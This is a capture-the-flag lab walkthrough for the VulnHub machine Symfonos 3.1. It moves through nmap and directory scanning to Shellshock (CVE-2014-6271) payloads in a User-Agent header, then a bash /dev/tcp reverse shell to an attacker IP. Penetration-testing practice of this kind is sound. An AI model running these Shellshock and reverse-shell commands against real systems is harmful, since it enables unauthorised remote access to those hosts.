# Symfonos: 3.1

- **Machine:** Symfonos: 3.1
- **Download:** https://www.vulnhub.com/entry/symfonos-31,332/

![](781-1.png)

---

# Machine Setup

1. Extract the downloaded archive.
2. Import the **OVF** file into VirtualBox.
3. Click **Finish**.
4. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

Identify the IP address assigned to the target.

```bash
nmap -sn 10.19.212.0/24
```

![](781-2.png)

---

## Full Nmap Scan

Perform a complete scan to enumerate open ports, services, operating system details, and default NSE script results.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 10.19.212.43
```

![](781-3.png)

---

## Optional Enumeration

Scan every TCP port.

```bash
nmap -v -p- 10.19.212.43
```

Run a standard service detection scan.

```bash
nmap -sC -sV -A 10.19.212.43
```

---

## HTTP Enumeration

Run the HTTP enumeration NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 10.19.212.43
```

---

# Web Enumeration

Browse the target website.

```text
http://10.19.212.43
```

---

## Directory Enumeration

Discover hidden directories.

```bash
gobuster dir -u http://10.19.212.43 -w /usr/share/wordlists/dirb/common.txt
```

![](781-4.png)

Discovered directories:

```text
http://10.19.212.43/gate/
```

```text
http://10.19.212.43/cgi-bin/
```

---

## Enumerate CGI Scripts

Perform additional enumeration against the CGI directory.

```bash
feroxbuster -u http://10.19.212.43/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

![](781-5.png)

Discovered endpoint:

```text
http://10.19.212.43/cgi-bin/underworld
```

![](781-6.png)

---

# Shellshock Vulnerability Verification

Test whether the CGI script is vulnerable to the Shellshock vulnerability.

```bash
curl -H 'User-Agent: () { :;}; echo; echo vulnerable' http://10.19.212.43/cgi-bin/underworld
```

![](781-7.png)

The server responds with injected output, confirming that the CGI application is vulnerable.

---

## Verify Command Execution

Execute a simple command to confirm Remote Command Execution.

```bash
curl -H 'User-Agent: () { :;}; echo; /usr/bin/id' http://10.19.212.43/cgi-bin/underworld
```

![](781-8.png)

The command executes successfully, confirming Remote Code Execution through the Shellshock vulnerability.

---

# Reverse Shell

## Start a Listener

On the attacker machine, start a Netcat listener.

```bash
nc -lvnp 4444
```

---

## Trigger the Reverse Shell

Execute a Bash reverse shell through the vulnerable CGI script.

```bash
curl -H 'User-Agent: () { :;}; /bin/bash -c "bash -i >& /dev/tcp/10.19.212.4/4444 0>&1"' http://10.19.212.43/cgi-bin/underworld
```

A reverse shell is received.

![](781-9.png)

---

# Shell Stabilization

Upgrade the shell to improve usability.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

```bash
stty rows 38 columns 116
```

---

# Vulnerability Summary

| No. | Vulnerability | Impact |
|-----|---------------|--------|
| 1 | Exposed CGI scripts | Increased attack surface |
| 2 | Shellshock (CVE-2014-6271) | Remote Command Execution |
| 3 | Insecure Bash CGI configuration | Remote shell access |
| 4 | Lack of input sanitization | Full system compromise |

---

# Key Learning

- Always enumerate the `/cgi-bin/` directory during web application assessments.
- Shellshock affects Bash when used to process environment variables supplied by CGI applications.
- A simple HTTP header can be sufficient to achieve Remote Command Execution on vulnerable systems.
- Confirm code execution with harmless commands before attempting further exploitation.
- Upgrading a reverse shell significantly improves interaction with the compromised system.

---

# Summary

The assessment began with network reconnaissance, revealing an HTTP service hosting CGI scripts. Directory enumeration identified the `/cgi-bin/underworld` endpoint. Testing confirmed that the application was vulnerable to the **Shellshock (CVE-2014-6271)** vulnerability, allowing arbitrary command execution through a crafted `User-Agent` HTTP header. After verifying command execution with the `id` command, a Bash reverse shell was established, providing remote access to the target. The shell was then upgraded to a fully interactive session to facilitate further post-exploitation and privilege escalation activities.